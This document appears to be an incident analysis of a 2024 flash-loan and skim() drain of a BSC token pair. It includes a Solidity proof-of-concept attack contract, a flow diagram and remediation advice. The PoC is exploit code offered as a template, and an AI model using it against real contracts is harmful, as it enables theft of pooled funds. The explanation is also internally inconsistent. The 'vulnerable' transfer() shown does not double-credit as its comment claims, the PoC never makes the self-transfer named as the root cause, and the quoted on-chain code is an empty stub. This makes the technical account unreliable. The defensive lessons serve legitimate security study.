# Hackathon — Same-Address Transfer Balance Double-Credit + Repeated skim Drain Analysis

| Field | Details |
|------|------|
| **Date** | 2024-04 |
| **Protocol** | Hackathon |
| **Chain** | BSC |
| **Loss** | ~$20,000 |
| **Vulnerable Contract** | [Hackathon 0x11cee747](https://bscscan.com/address/0x11cee747Faaf0C0801075253ac28aB503C888888) |
| **Root Cause** | Hackathon token `transfer()` logic double-credits balances when `sender == recipient == pair`, and repeatedly calling `skim()` infinitely drains the excess over reserves |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-04/Hackathon_exp.sol) |

---

## 1. Vulnerability Overview

The Hackathon token's `transfer()` function contains a double-credit bug that adds the balance twice when the sender and recipient are the same pair contract (`sender == recipient == pair`). The attacker borrowed BUSD via a DODO flash loan, purchased Hackathon tokens, then exploited this vulnerability to artificially inflate the pair contract's balance, before calling `skim()` 10 times in succession to drain the excess over reserves.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: double-credit balance when sender == recipient
contract HackathonToken {
    mapping(address => uint256) private _balances;

    function transfer(address recipient, uint256 amount) public returns (bool) {
        address sender = msg.sender;
        _balances[sender] -= amount;
        _balances[recipient] += amount;  // ← if sender == recipient: subtract then re-add = net increase
        // However, tax mechanism + pair logic allows skim without _update()

        // When transferring to pair, reserves are not updated → excess extractable via skim()
        return true;
    }
}

// pair.skim(): transfers (balance - reserve) to `to`
// If Hackathon balance exceeds reserves, the difference can be extracted

// ✅ Safe code: prevent sender == recipient + block skim
function transfer(address recipient, uint256 amount) public returns (bool) {
    require(recipient != msg.sender, "self-transfer not allowed");
    // ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: Hackathon_decompiled.sol
contract Hackathon {
    function transfer(address p0, uint256 p1) external {}  // ❌ Vulnerability
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] DODO DPP Flash Loan: 200,000 BUSD
  │
  ├─→ [2] Swap BUSD → Hackathon (PancakeRouter)
  │
  ├─→ [3] Transfer Hackathon tokens to pair contract
  │         └─ Creates state where pair real balance > pair reserves
  │
  ├─→ [4] pair.skim(attacker) × 10 iterations
  │         └─ Each iteration receives (balance - reserve) in Hackathon
  │
  ├─→ [5] Swap Hackathon → BUSD × 10 iterations
  │
  ├─→ [6] Repay DODO flash loan
  │
  └─→ [7] ~$20K profit
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IDPPOracle {
    function flashLoan(uint256 baseAmount, uint256 quoteAmount, address assetTo, bytes calldata data) external;
}

interface IPancakePair {
    function skim(address to) external;
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
    function getReserves() external view returns (uint112, uint112, uint32);
}

contract AttackContract {
    IDPPOracle  constant dpp  = IDPPOracle(/* DODO DPP */);
    IPancakePair constant pair = IPancakePair(/* BUSD-Hackathon pair */);
    IERC20 constant BUSD       = IERC20(0x55d398326f99059fF775485246999027B3197955);
    IERC20 constant HACK       = IERC20(0x11cee747Faaf0C0801075253ac28aB503C888888);

    function testExploit() external {
        dpp.flashLoan(0, 200_000e18, address(this), abi.encode(""));
    }

    function DPPFlashLoanCall(address, uint256, uint256 quoteAmt, bytes calldata) external {
        // [1] Swap BUSD → Hackathon
        swapBUSDToHack(quoteAmt);

        // [2] Transfer Hackathon to pair + repeat skim 10 times
        for (uint i = 0; i < 10; i++) {
            uint256 hackBal = HACK.balanceOf(address(this));
            HACK.transfer(address(pair), hackBal / 10);
            pair.skim(address(this));  // Extract (balance - reserve)

            // Swap Hackathon → BUSD
            uint256 hackNow = HACK.balanceOf(address(this));
            swapHackToBUSD(hackNow / (10 - i));
        }

        // [3] Repay flash loan
        BUSD.transfer(address(dpp), quoteAmt);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Balance double-credit + repeated skim reserve drain |
| **CWE** | CWE-840: Business Logic Error |
| **Attack Vector** | External (flash loan + repeated skim) |
| **DApp Category** | Tax token + Uniswap V2 pair |
| **Impact** | Pair reserve depletion (~$20K) |

## 6. Remediation Recommendations

1. **Block self-transfers**: Add `require(recipient != msg.sender)`
2. **Disable skim**: Disable the `skim()` function on tax/rebase token pairs
3. **Force sync**: Immediately synchronize reserves via `_update()` after transfers
4. **skim cooldown**: Block repeated `skim()` calls within the same block

## 7. Lessons Learned

- The combination of tax tokens and Uniswap V2 `skim()` is a recurring attack pattern on BSC.
- The `sender == recipient` edge case is a corner case in token transfer logic that can cause balance inconsistencies.
- AMM reserve updates (`_update()`) must occur immediately upon token transfer; delayed synchronization creates opportunities for skim-based drains.